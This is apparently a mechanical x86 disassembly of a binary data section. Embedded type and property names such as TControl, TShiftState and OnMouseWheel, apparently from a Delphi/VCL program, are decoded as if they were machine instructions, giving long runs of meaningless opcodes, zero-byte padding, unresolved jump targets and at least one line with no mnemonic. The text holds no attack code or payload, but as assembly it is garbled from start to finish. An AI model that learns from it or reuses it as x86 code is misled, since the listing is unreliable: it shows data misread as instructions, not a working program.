rol [ eax + eax + 0x11 ] 0x54
inc esp
jb r-xdata
add [ eax - 0x42 ] al
outsd
insb
jae r-xdata
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc ebx
outsd
outsb
je r-xdata
inc esp
add [ esi + edi * 4 ] dh
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
xor eax 0x32b40040
inc eax
add al dl
xor al [ eax ]
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ eax - 0x47ffbb42 ] ah
rol [ eax + eax + 0x60 ] 0x35
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax + eax * 8 ] ch
inc esp
add [ edi + edi * 4 ] ch
inc esp
add [ ecx + eax * 8 - 0x41e7ffbc ] ah
inc esp
add [ edi * 4 - 0x3fa3ffbc ] bl
inc esp
add al ah
mov esp 0xbe340044
inc esp
add [ eax ] bh
mov esi 0xbe400044
add [ ebx + 0x449598c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
xchg ebp eax
inc esp
add [ eax ] dh
add [ eax ] al
mov [ esp + eax * 2 + 0x40354c00 ] dl
inc esp
add [ eax - 0x41 ] bh
inc esp
add [ edi * 4 - 0x412bffbc ] bl
inc esp
add al ah
mov esp 0xbf840044
inc esp
add [ eax ] bh
mov esi 0xbfa40044
inc esp
add [ eax ] al
mov edi 0xbeb00044
inc esp
add [ edx ] dl
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + esi * 8 - 0x6e ] si
inc esp
add [ eax + 0x4492 ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
aad 0x44
add [ ebx ] cl
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al bl
and al [ edx ]
clc
jae r-xdata
push esp
inc esp
jb r-xdata
inc esp
add [ edi + edi * 4 - 0x40ffffbc ] ah
inc esp
add [ eax + 0x120044be ] dh
outsd
insb
jae r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx * 4 + 0x44 ] cl
add [ eax + eax ] ah
add [ eax ] ch
cmp [ edx ] al
dec esp
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax - 0x27ffbb2d ] cl
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
xchg esi eax
pushad
xchg esi eax
inc esp
add [ edi ] al
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
add [ ebp - 0x6c47ffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
add [ eax ] bl
fadd [ eax + eax + 0x40 ]
and eax [ edx ]
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
fsub [ edx ]
inc edx
add al bh
jae r-xdata
add [ eax ] al
add [ eax - 0x69 ] dl
inc esp
add [ eax + eax ] bl
add [ eax ] al
xor al 0xa8
inc ebp
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
xchg esi eax
inc esp
add [ eax + edi + 0x40042 ] dl
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc edx
add [ edi + edx * 8 ] al
inc esp
add [ edi + ebp * 4 ] bl
inc ebp
add [ eax - 0x29 ] bh
inc esp
add [ edi + ebp * 4 + 0x45 ] al
add [ eax - 0x51 ] bl
inc ebp
add al dh
fadd [ eax + eax - 0x54 ]
xlat
inc esp
add [ edi + ebp * 4 - 0x5057ffbb ] dl
inc ebp
add ah ah
xlat
inc esp
add al dl
scasd [ edi ]
inc ebp
add [ eax - 0x28 ] al
inc esp
add al bl
scasd [ edi ]
inc ebp
add [ eax - 0x28 ] ah
inc esp
add al ah
scasd [ edi ]
inc ebp
add [ ecx + ebx * 8 + 0x44 ] dh
add [ ecx + ebx * 8 + 0x44 ] dl
add [ ecx + ebx * 8 - 0x277fffbc ] dl
inc esp
add ah dh
scasd [ edi ]
inc ebp
add al bh
scasd [ edi ]
inc ebp
add [ eax + ebx * 8 - 0x29ebffbc ] ah
outsd
insb
jae r-xdata
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x44976890
add [ ebx ] al
or al 0x54
add [ ebp - 0x692bffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 4 ] ch
outsd
insd
popad
je r-xdata
inc esp
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x6b610874
outsd
insb
jae r-xdata
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al ah
xchg edi eax
inc esp
add [ ebx ] cl
jae r-xdata
cwde
inc esp
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi + edx * 4 + 0x44 ] ah
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
dec ebp
popad
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al cl
xchg edx eax
inc ecx
add [ eax ] dl
pushad
xor eax 0x35540040
inc eax
outsd
insb
jae r-xdata
inc esp
add [ esi ] al
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
cwde
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
shl ah 0x97
outsb
add [ fs : eax ] eax
add [ eax ] al
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
pop eax
aad 0x44
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
inc eax
add ah ch
cwde
inc esp
add [ esi ] al
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
jbe r-xdata
outsd
insb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
push 0x4498fc74
add [ eax + eax ] dl
add bh bh
pop eax
aad 0x44
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
push eax
0xb080044 0x4d54
outsd
cwde
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
cld
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x4498fc74
jb r-xdata
aad 0x44
add [ eax - 0x6fffbb68 ] esp
jb r-xdata
jb r-xdata
inc esp
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
inc esp
add [ edx ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
salc
xchg edi eax
inc esp
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x449ac8c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
cwde
inc esp
add [ eax ] dl
add [ eax ] al
[ eax - 0x2b ]
inc esp
imul ebp [ esi + 0x74 ] 0x44996873
add al dh
inc ecx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
jae r-xdata
add [ ecx + 0xf010044 ] bl
mov al [ 0xffffffff90004498 ]
imul ebp [ edi + 0x6e ] 0x988cc08b
inc esp
add [ eax + 0x74614454 ] al
add [ gs : eax + 0x4004498 ] ebx
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
lea eax [ eax ]
xor [ eax + 0x9030044 ] bl
push esp
inc esp
jb r-xdata
insb
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
inc esp
outsd
insb
jae r-xdata
pop eax
aad 0x44
inc ebx
outsd
outsb
jae r-xdata
add al ah
xchg ebx eax
inc ecx
add ah dh
xchg edx eax
inc ecx
add ah ah
aad 0x44
add ah dl
aam 0x44
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
imul ebp [ esi + 0x74 ] 0x657a6953
add eax 0x0
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
push esp
inc ebx
outsd
outsb
jae r-xdata
inc esp
add [ eax + r-xdata ] dl
add [ edi ] ecx
add [ ebx ] al
add [ eax ] al
add [ eax + 0x6004498 ] ah
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
imul ebp [ esi + 0x64 ] 0x1
outsb
mov eax eax
mov [ eax + 0x5040044 ] ds
push esp
inc esp
popad
je r-xdata
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ gs : eax + ebx * 4 + 0xb030044 ] esp
push esp
inc ecx
outsb
add [ eax + 0x6d695454 ] al
add [ ecx ] al
add [ eax ] al
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ ecx + edx ] al
inc eax
add [ eax + 0x10 ] ch
inc eax
add [ ebp + ebx * 2 + 0x41 ] ah
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ eax ] cl
add [ eax ] al
[ eax - 0x2b ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
add ah bh
cwde
inc esp
popad
js r-xdata
jb r-xdata
dec esp
popad
cwde
add eax 0x6d695454
add [ eax + 0x4004498 ] ebx
arpl [ eax + 0x6f ] bp
jb r-xdata
add al 0x5
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x4498a401
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
outsd
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
popad
outsb
add [ ecx + edx ] al
inc eax
add [ ecx + edx ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
add [ eax + r-xdata ] dl
push 0x64004010
pop ebp
inc ecx
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
imul esp [ edi + 0x68 ] 0x4498fc74
imul esp [ gs : edi + 0x68 ] 0x4498fc74
add [ eax + eax ] cl
add bh bh
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
xchg esp eax
cdq
inc esp
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
add [ ecx ] al
add [ eax ] al
add [ edi + edx * 4 + 0x64080044 ] ah
insd
dec ebp
popad
outsb
jne r-xdata
inc eax
add [ eax ] dh
cwde
inc esp
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx ] bh
add al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
push esp
dec ebx
jns r-xdata
inc esp
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add al ah
xchg edi eax
inc esp
add [ eax ] al
adc [ eax ] al
nop
cmp al 0x9c
inc esp
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
cmp al 0x10
outsb
je r-xdata
add al 0x11
inc eax
add [ ebp + ebx * 2 + 0x41 ] ah
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x64d3ffc0 ] cl
inc esp
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
jb r-xdata
add al 0x11
inc eax
add [ eax - 0x1bffbb6e ] al
pushfd
inc esp
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
or [ esi ] cl
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
cmp al 0x10
add [ eax ] cl
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
adc [ edx - 0x631bffbc ] 0x44
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
outsb
je r-xdata
je r-xdata
jb r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx ] al
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
mov ah 0x9b
inc esp
add [ eax ] cl
push cs
push esp
inc ebx
push 0x4007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp - 0x644bffc0 ] cl
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
add al 0x11
inc eax
add [ eax ] ah
xchg ebp eax
inc esp
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x6257ffc0 ] cl
inc esp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax - 0x63 ] al
inc esp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
push ebx
add ecx [ eax ]
push es
add al 0x11
inc eax
add [ edi + edx * 4 + 0x44 ] ah
add [ ebp + ebx * 2 + 0x41 ] ah
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x6363ffc0 ] cl
inc esp
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] al
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc eax
add [ eax ] ah
xchg ebp eax
inc esp
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add al ah
xchg edi eax
inc esp
add [ eax ] al
adc [ eax ] al
nop
cmp [ esi + 0xc080044 ] bl
push esp
add al 0x11
outsb
je r-xdata
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
inc esp
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
jl r-xdata
nop
movsb [ edi ] [ esi ]
inc esp
add [ eax ] al
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
outsd
outsb
je r-xdata
push esp
inc ebx
outsd
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
inc ebx
jpe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
and [ ebp - 0x610fffbc ] dl
inc esp
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax + 0x44a4 ] dl
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] al
inc eax
add [ eax + 0x680044a4 ] dl
lodsb [ esi ]
inc esp
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
sahf
inc esp
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x44a07cc0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x44a104c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
jb r-xdata
jb r-xdata
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
add al 0xa1
inc esp
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
je r-xdata
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl al
mov [ 0xffffffffa4860044 ] al
inc esp
add [ ecx + eax ] bl
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
add al 0x11
inc eax
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add ah bl
in eax dx
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax - 0x37ffbb1e ] ah
jmp r-xdata
add [ eax ] al
insb
jae r-xdata
push eax
outsd
jo r-xdata
inc ebp
inc esp
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
jne r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
jo r-xdata
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
in al dx
lahf
inc esp
add [ eax ] cl
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x800040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ ecx + ebx * 8 - 0x7afffbc ] dh
inc esp
add [ eax + edi * 8 + 0x44 ] cl
add [ ecx + edi * 8 ] bl
inc esp
add al bh
fild [ eax + eax + 0x3c ]
jecxz r-xdata
in al dx
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add al ah
cld
inc esp
add [ edx + esi + 0x32d00040 ] dh
inc eax
jo r-xdata
js r-xdata
outsb
je r-xdata
add [ ebx + esi * 2 + 0x41 ] ch
inc ebp
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
